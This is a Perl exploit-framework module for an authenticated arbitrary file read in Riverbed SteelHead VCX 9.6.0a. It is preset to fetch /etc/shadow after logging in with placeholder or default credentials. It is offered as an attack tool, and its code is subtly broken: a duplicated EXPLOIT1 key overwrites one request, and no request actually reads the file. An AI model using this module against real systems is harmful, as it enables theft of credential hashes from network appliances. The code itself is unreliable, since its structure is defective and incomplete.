package RIVERBED::MSF::RiverbedSteelheadVcxFileRead;
use lib qw(../../); use parent qw(Exploit);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use File::Slurp qw(read_file);

# # 
# # 
# # 

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   

   my $name = "RiverbedSteelheadVcxFileRead";

   my $DETECTION = {

   };

my $EXPLOIT = {
  DESCRIPTION => "

          This module exploits an authenticated arbitrary file read in the log module's filter engine.

          SteelHead VCX (VCX255U) version 9.6.0a was confirmed as vulnerable.

      ",
  METHOD      => "GET",
  MSF_MODULE  => "riverbed_steelhead_vcx_file_read",
  PATH        => "next=/&",
  PATHS       => ["login", ""],
  PAYLOAD     => "?",
  TITLE       => "Riverbed SteelHead VCX File Read",
  USERTITLE   => "admin",
  VARIABLES => {
    'TARGETURI' =>       { DESCRIPTION => "", VALUE => "" },
    'PATH' =>       { DESCRIPTION => "Vulnerable URI path", VALUE => "/" },
    'FILE' =>       { DESCRIPTION => "Remote file to view", VALUE => "/etc/shadow" },
    'USERNAME' =>       { DESCRIPTION => "", VALUE => "" },
    'CSRF' =>       { DESCRIPTION => "", VALUE => "" },
    'PASSWORD' =>       { DESCRIPTION => "Password", VALUE => "password" },
    'FULL_URI' =>       { DESCRIPTION => "", VALUE => "" },
  },

  TYPE => 'MSF',
  PLATFORM => 'SCANNER',
  REQUESTS => {
    EXPLOIT1 => {
      METHOD       => 'GET',
      PATH   => '',
      PAYLOAD      => '',
      TEXT   => 'Sending Exploit #1 Request : [GET] ',
      HEADERS      => {
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
    EXPLOIT1 => {
      METHOD       => 'POST',
      PATH   => 'login',
      PAYLOAD      => 'csrfmiddlewaretoken=&_fields=%7b%22username%22%3a%22__USERNAME__%22%2c%22password%22%3a%22__PASSWORD__%22%2c%22legalAccepted%22%3a%22N/A%22%2c%22userAgent%22%3a%22%22%7d',
      TEXT   => 'Sending Exploit #1 Request : [POST] /login',
      HEADERS      => {
        'Cookie' => '',
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($name, $DETECTION, $EXPLOIT, @_);
}

return 1;
